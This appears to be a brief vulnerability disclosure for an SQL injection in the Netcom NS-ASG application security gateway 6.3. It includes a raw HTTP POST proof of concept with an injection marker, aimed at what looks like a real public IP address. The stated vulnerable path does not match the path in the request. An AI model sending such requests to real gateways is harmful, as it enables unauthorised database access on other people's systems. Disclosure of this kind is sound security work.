Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3 Vulnerability Path ： /protocol/iscdevicestatus/deleteonlineuser.php

<img width="631" alt="图片" src="https://github.com/charliecatsec/cve1/assets/171440363/da2ad629-f271-406e-96e5-168414e6e173">

Poc：
```
POST /protocol/index.php HTTP/1.1
Host: 1.85.53.53
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

jsoncontent={"protocolType":"getethname","messagecontent":"1*"}
```
<img width="642" alt="图片" src="https://github.com/charliecatsec/cve1/assets/171440363/4299d23e-2d2b-4787-a3c1-40043a122fb4">
<img width="604" alt="图片" src="https://github.com/charliecatsec/cve1/assets/171440363/46370091-9267-4645-8c35-b5575a3ae2d3">

